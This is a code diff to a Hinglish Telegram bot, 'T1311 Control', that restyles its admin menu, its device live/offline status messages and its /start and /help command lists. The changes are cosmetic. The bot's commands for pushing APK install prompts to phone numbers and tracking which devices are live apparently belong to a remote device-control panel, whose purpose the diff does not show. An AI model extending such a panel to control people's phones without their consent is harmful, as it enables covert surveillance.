@@ -146,11 +146,13 @@ def tg_answer(callback_id, text=None):
 # ---- Console menus ----
 def main_menu_text():
     live_count = len([n for n in last_seen if is_live(n)])
+    root = get_root_number() or '❌ not set'
     return (
         f"🎛️ <b>Admin Console</b>\n"
-        f"Root user ke liye Telegram control panel.\n\n"
-        f"📊 Live devices: <b>{live_count}</b>\n"
-        f"🔗 Root number: {get_root_number() or '❌ not set'}\n\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Live devices:  <b>{live_count}</b>\n"
+        f"🔗 Root number:  {root}\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
         f"Koi option chuniye 👇"
     )
 
@@ -617,9 +619,9 @@ def handle_pending_text(chat_id, action, text):
         if text.isdigit() and len(text) == 10:
             live = is_live(text)
             if live:
-                tg_send(chat_id, f"🟢 <b>{text}</b> — LIVE")
+                tg_send(chat_id, f"📡 <b>Live Check</b>\n━━━━━━━━━━\n🟢 <b>{text}</b> — LIVE")
             else:
-                tg_send(chat_id, f"🔴 <b>{text}</b> — OFFLINE\n\nInstall karna hai?",
+                tg_send(chat_id, f"📡 <b>Live Check</b>\n━━━━━━━━━━\n🔴 <b>{text}</b> — OFFLINE\n\nInstall karna hai?",
                         kb([[("📲 Install", "admin:install")]]))
         else:
             tg_send(chat_id, "❌ 10 digit number daalo.")
@@ -662,9 +664,9 @@ def handle_pending_text(chat_id, action, text):
         if text.isdigit() and len(text) == 10:
             live = is_live(text)
             if live:
-                tg_send(chat_id, f"🟢 <b>{text}</b> — LIVE")
+                tg_send(chat_id, f"📊 <b>Status</b>\n━━━━━━━━━━\n🟢 <b>{text}</b> — LIVE")
             else:
-                tg_send(chat_id, f"🔴 <b>{text}</b> — OFFLINE")
+                tg_send(chat_id, f"📊 <b>Status</b>\n━━━━━━━━━━\n🔴 <b>{text}</b> — OFFLINE")
         else:
             tg_send(chat_id, "❌ 10 digit number daalo.")
         show_admin_menu(chat_id)
@@ -774,18 +776,49 @@ def handle_command(chat_id, text, from_webapp):
             tg_send(chat_id, f"📲 <b>{number}</b> ke liye install prompt:", buttons=True)
         return
 
-    # /help
-    if text.lower() in ("/help", "/start"):
+    # /start — professional welcome
+    if text.lower() == "/start":
         tg_send(
             chat_id,
-            "Available commands:\n"
-            "/admin — Admin Console (root user)\n"
-            "/register 98XXXXXXXX — apna number register karo\n"
-            "/status 98XXXXXXXX — live/offline check\n"
-            "/install 98XXXXXXXX — install prompt bhejo\n"
-            "/device — smart install (device info → APK)\n"
-            "/build — one-click build (GitHub Actions)",
+            f"👋 <b>Welcome to T1311 Control</b>\n\n"
+            f"Ek smart device-control system — Telegram se apne devices manage karein.\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"<b>🎛️ Main Menu</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>🎛️ /admin</b> — Admin Console (root user)\n"
+            f"<b>📊 /status</b> — Device live/offline check\n"
+            f"<b>📲 /install</b> — Install prompt bhejo\n"
+            f"<b>🔨 /build</b> — APK build (GitHub)\n"
+            f"<b>🤖 /device</b> — Smart Install (device info → APK)\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"<i>/help use karke saari commands dekhein.</i>",
+            buttons=False,
         )
+        return
+
+    # /help — command list (clean, aligned)
+    if text.lower() in ("/help", "/start@T1311bot"):
+        tg_send(
+            chat_id,
+            f"📋 <b>Available Commands</b>\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"<b>🎛️ /admin</b>\n"
+            f"    Admin Console (root user)\n"
+            f"<b>📊 /status</b>\n"
+            f"    <code>/status 98XXXXXXXX</code>\n"
+            f"<b>📲 /install</b>\n"
+            f"    <code>/install 98XXXXXXXX</code>\n"
+            f"<b>🔨 /build</b>\n"
+            f"    <code>/build v1.0.0</code>\n"
+            f"<b>🤖 /device</b>\n"
+            f"    Smart Install (device info → APK)\n"
+            f"<b>📝 /register</b>\n"
+            f"    <code>/register 98XXXXXXXX</code>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"<i>Help ke liye hamesha yahan available.</i>",
+            buttons=False,
+        )
+        return
 
 
 # ----------------------------------------------------------------------
